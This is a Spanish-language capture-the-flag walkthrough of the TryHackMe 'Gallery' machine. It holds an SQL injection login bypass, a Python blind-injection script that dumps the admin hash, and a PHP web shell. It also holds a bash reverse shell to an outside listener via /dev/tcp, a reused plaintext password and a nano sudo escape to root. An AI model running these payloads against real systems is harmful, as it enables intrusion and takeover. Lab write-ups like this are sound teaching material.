Write up de la maquina Gallery de dificultad facil de la plataforma Tryhackme.

![](/assets/img/gallery/machine.png)

## Enumeracion
Empezemos haciendo un escaneo de puerto a la maquina victima
```bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.47.107

PORT     STATE SERVICE    REASON
80/tcp   open  http       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63
```
Intentemos detectar la version que corre para estos dos puertos y exportar el output en un archivo

```bash
❯ nmap -sCV -p80,8080 10.10.47.107 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-02 15:30 -05
Nmap scan report for 10.10.47.107
Host is up (0.25s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Simple Image Gallery System
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
```
Accedamos a la web para ver, en el puerto 80 solo tenemos una pagina predeterminada de apache.
![](/assets/img/gallery/web.png)

Al acceder a la pagina web que corre en el puerto 8080 nos redirije a un panel de login.
![](/assets/img/gallery/web2.png)

Este login se puede bypassear con una inyeccion sql simple *\' or 1=1-\- -* 

La inyeccion sql es basada en la respuesta del lado del servidor, si quisieramos dumpear la contraseña del administrador lo podriamos hacer atraves de este script de python

```python
#!/usr/bin/python3

import string, signal, pdb, requests
from pwn import *

def ctrl_c(sig, frame):

    print ("\n\n[!] Saliendo.\n")
    sys.exit(1)

# Ctr + C
signal.signal(signal.SIGINT, ctrl_c)

# Variables
url = 'http://10.10.47.107/gallery/classes/Login.php?f=login'
characters = 'abcdef' + string.digits


def SQlI():
    
    l1 = log.progress('SQLI')

    l1.status("Iniciando Ataque")
    
    password = ''

    time.sleep(1)
    
    l2 = log.progress('Password')

    for position in range(1,35):

        for character in characters:

            data_post = {
                    "username":"admin' and if(substring(password,%d,1)='%c',sleep(0),1)-- -" % (position, character),
                    "password":"admin"
                    }

            l1.status(data_post['username'])

            r = requests.post(url, data=data_post)

            if "success" not in r.text:
                
                password += character
                l2.status(password)
                break


if __name__ == "__main__":
    SQlI()
```

Lo ejecutamos y nos da la contraseña la cual esta en md5
```bash
❯ python3 sqlI.py
[.] SQLI: admin' and if(substring(password,34,1)='9',sleep(0),1)-- -
[◑] Password: a228b12a08b6527e7978cbe5d914531c
```
Bueno esta contraseña no nos va a servir para nada, como el login lo pudimos bypassear con \' or 1=1-\- -,  veamos que podemos hacer en este panel administrativo.

Si le echamos un ojo a la seccion de nuestra cuenta podemos subir un archivo
![](/assets/img/gallery/pan.png)

Creemos un archivo .php atraves del cual poder ejecutar comandos.
```bash
❯ cat shell.php
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Si subimos este archivo y filtramos por shell.php en el codigo fuente de esta pagina podemos ver la ruta en la que se subio el archivo
![](/assets/img/gallery/sh.png)

Probemos si la webshell se subio correctamente y bueno tenemos Capacidad de Ejecutar comandos en el sistema.
```bash
❯ curl -s -X GET -G "http://10.10.47.107/gallery/uploads/1677791220_shell.php" --data-urlencode 'cmd=whoami' |html2text;echo
www-data
```
Mandemenos una revershell en la cual operar mas comodos
```bash
❯ curl -s -X GET -G "http://10.10.47.107/gallery/uploads/1677791220_shell.php" --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.8.47.45/4444 0>&1"'
```
Y nos llega la consola
```bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.47.45] from (UNKNOWN) [10.10.1.214] 36086
bash: cannot set terminal process group (687): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gallery:/var/www/html/gallery/uploads$ whoami
whoami
www-data
www-data@gallery:/var/www/html/gallery/uploads$ 
```
## Movimiento lateral
Enumerando el sistema me encontre con un directorio interesante, que parese ser el backup del directorio /home/mike

```bash
www-data@gallery:/var/backups$ cd /var/backups/
www-data@gallery:/var/backups$ ls -la
total 60
drwxr-xr-x  3 root root  4096 Mar  2 21:14 .
drwxr-xr-x 13 root root  4096 May 20  2021 ..
-rw-r--r--  1 root root 34789 Feb 12  2022 apt.extended_states.0
-rw-r--r--  1 root root  3748 Aug 25  2021 apt.extended_states.1.gz
-rw-r--r--  1 root root  3516 May 21  2021 apt.extended_states.2.gz
-rw-r--r--  1 root root  3575 May 20  2021 apt.extended_states.3.gz
drwxr-xr-x  5 root root  4096 May 24  2021 mike_home_backup
www-data@gallery:/var/backups$ 
```
Ingresemos al directorio para ver que archivos tiene

```bash
www-data@gallery:/var/backups$ cd mike_home_backup/
www-data@gallery:/var/backups/mike_home_backup$ ls -la
total 36
drwxr-xr-x 5 root root 4096 May 24  2021 .
drwxr-xr-x 3 root root 4096 Mar  2 21:14 ..
-rwxr-xr-x 1 root root  135 May 24  2021 .bash_history
-rwxr-xr-x 1 root root  220 May 24  2021 .bash_logout
-rwxr-xr-x 1 root root 3772 May 24  2021 .bashrc
drwxr-xr-x 3 root root 4096 May 24  2021 .gnupg
-rwxr-xr-x 1 root root  807 May 24  2021 .profile
drwxr-xr-x 2 root root 4096 May 24  2021 documents
drwxr-xr-x 2 root root 4096 May 24  2021 images
www-data@gallery:/var/backups/mike_home_backup$ 
```
Si leemos el .bash_history vemos la contraseña del usuario mike en texto claro
```bash
www-data@gallery:/var/backups/mike_home_backup$ cat .bash_history 
cd ~
ls
ping 1.1.1.1
cat /home/mike/user.txt
cd /var/www/
ls
cd html
ls -al
cat index.html
sudo -lb3stpassw0rdbr0xx
clear
sudo -l
exit
```
Migremos a este usuario usando esta contraseña
```bash
www-data@gallery:/var/backups/mike_home_backup$ su mike
Password: 
mike@gallery:/var/backups/mike_home_backup$ whoami
mike
mike@gallery:/var/backups/mike_home_backup$ 
```
## Escalada De Privilegios
Si vemos los privilegios que tenemos a nivel de sudoers podemos ejecutar un script de bash como root sin proporcionar contraseña
```bash
mike@gallery:/var/backups/mike_home_backup$ sudo -l
Matching Defaults entries for mike on gallery:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
mike@gallery:/var/backups/mike_home_backup$ 
```
Este es el script de bash
```bash
mike@gallery:/var/backups/mike_home_backup$ cat /opt/rootkit.sh 
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
mike@gallery:/var/backups/mike_home_backup$ 
```
Ya veo una via atraves de la cual ejecutar comandos, en el modo read, abre un archivo con nano, bueno en nano podemos ejecutar comandos solamente tenemos que presionar **ctrl + r** y **ctrl + x**, y despues poner el comando que queramos ejecutar.

Ejecutemos el script y pongamos read en el argumento que nos pide el script

```bash
mike@gallery:/var/backups/mike_home_backup$ sudo /bin/bash /opt/rootkit.sh 
Would you like to versioncheck, update, list or read the report ? read
```
Nos abre el archivo presionemos **control + r** y **control + x**, le voy asignar el privelegio suid a la bash para poder lanzarmela temporamente como el propietario, solo es ejecutar **chmod u+s /bin/bash**, para poder ejecutar este comando previamente tenemos que ejeuctar las dos combinaciones de teclas que mencione anteriormente.

ejecutamos bash -p para que nos de la consola como  el propietario que es root, y hay podemos visualizar la flag.
```bash
mike@gallery:/var/backups/mike_home_backup$ bash -p
bash-4.4# whoami
root
bash-4.4# cat /root/root.txt 
THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}
bash-4.4# 
```
Gracias  por leer